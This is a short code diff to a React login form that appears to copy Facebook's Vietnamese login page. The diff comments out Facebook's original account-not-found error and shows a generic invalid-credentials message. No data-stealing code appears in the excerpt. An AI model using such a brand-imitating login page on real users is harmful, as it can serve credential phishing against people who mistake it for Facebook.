@@ -94,7 +94,8 @@ const FormComponent = () => {
                 <p>Tải Facebook dành cho Android và lướt xem nhanh hơn.</p>
             </div>
             <div className={`err ${showErr === true ? 'active' : ''}`}>
-                <p>Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <Link to="">Đăng ký tài khoản.</Link></p>
+                {/* <p>Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <Link to="">Đăng ký tài khoản.</Link></p> */}
+                <p>Tên người dùng hoặc mật khẩu không hợp lệ</p>
             </div>
 
             <div className="login-page">
